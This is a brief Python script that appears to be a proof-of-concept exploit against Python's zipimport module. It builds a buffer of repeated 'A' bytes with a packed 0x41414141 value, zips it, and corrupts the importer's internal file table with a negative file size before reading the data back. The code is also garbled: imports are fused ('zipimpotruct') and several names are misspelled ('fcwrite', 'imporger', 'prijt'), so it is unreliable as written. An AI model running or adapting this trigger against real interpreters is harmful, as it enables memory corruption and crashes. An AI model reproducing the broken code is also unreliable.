import zipimpotruct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payroadd= bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    fcwrite(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
imporger._files[FILE] = tuple(f)
prijt(importer.get_data(FILE))
